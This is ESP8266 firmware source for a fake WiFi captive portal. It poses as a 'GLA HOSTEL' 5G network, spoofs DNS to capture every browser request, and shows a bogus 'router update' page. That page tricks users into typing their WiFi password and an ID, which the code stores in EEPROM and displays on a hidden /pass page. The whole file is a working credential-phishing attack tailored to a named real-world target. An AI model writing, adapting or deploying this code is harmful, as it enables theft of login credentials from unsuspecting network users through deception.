// ESP8266 WiFi Captive Portal with ID Storage

// Libraries
#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default SSID name
const char* SSID_NAME = "GLA_HOSTEL_5G";

// Default main strings
#define SUBTITLE "GLA HOSTEL NEW PORTAL 5G SERVICES"
#define TITLE "FOR 2ND FLOOR"
#define BODY "NEW SECURE PORTAL TESTING DESIGN, CONNECT, LOGING & PLAY"
#define POST_TITLE "Updating..."
#define POST_BODY "Your router is being updated. Please, wait until the process finishes.</br>Thank you."
#define PASS_TITLE "Passwords and IDs"
#define CLEAR_TITLE "Cleared"

// Init system settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(192, 168, 1, 21); // Gateway

String allPass = "";
String allIDs = "";  // Store all IDs
String newSSID = "";
String currentSSID = "";

// For storing passwords and IDs in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.
int idStart = 300;             // Starting location in EEPROM to save ID.
int idEnd = idStart;           // Ending location in EEPROM to save ID.

unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String footer() { 
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>" + a + " :: " + t + "</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>" + CSS + "</style>"
    "<meta charset=\"UTF-8\"></head>"
    "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h; }

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi password:</label>" +
    "<input type=password name=m></input><label>ID:</label><input type=text name=id></input><input type=submit value=Start></form>" + footer();
}

String posted() {
  String pass = input("m");
  String id = input("id");
  pass = "<li><b>" + pass + "</b></li>";  // Adding password in an ordered list.
  id = "<li><b>" + id + "</b></li>";      // Adding ID in an ordered list.
  allPass += pass;                        // Updating the full passwords.
  allIDs += id;                           // Updating the full IDs.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i) {
    EEPROM.write(passEnd + i, pass[i]);    // Adding password to existing password in EEPROM.
  }
  passEnd += pass.length(); // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');

  // Storing ID to EEPROM.
  for (int i = 0; i <= id.length(); ++i) {
    EEPROM.write(idEnd + i, id[i]);        // Adding ID to EEPROM.
  }
  idEnd += id.length(); // Updating end position of IDs in EEPROM.
  EEPROM.write(idEnd, '\0');
  
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass() {
  return header(PASS_TITLE) + "<ol><b>Passwords:</b>" + allPass + "</ol><ol><b>IDs:</b>" + allIDs + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords and IDs</a></p></center>" + footer();
}

String clear() {
  allPass = "";
  allIDs = "";
  passEnd = passStart;  // Resetting the password end location -> starting position.
  idEnd = idStart;      // Resetting the ID end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.write(idEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password and ID lists have been reset.</p></div><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() { // The built-in LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++) {
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup() {
  // Serial begin
  Serial.begin(115200);
  
  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i) {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i]) {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i) {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM.
      EEPROM.write(idStart, '\0');   // Clear ID location in EEPROM.
      EEPROM.commit();
      break;
    }
  }

  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and ID and end locations in EEPROM.
  while (EEPROM.read(passEnd) != '\0') {
    allPass += char(EEPROM.read(passEnd)); // Reading the stored password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }

  while (EEPROM.read(idEnd) != '\0') {
    allIDs += char(EEPROM.read(idEnd));    // Reading the stored ID in EEPROM.
    idEnd++;                               // Updating the end location of ID in EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);  

  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.begin();
  webServer.on("/", []() { webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/pass", []() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
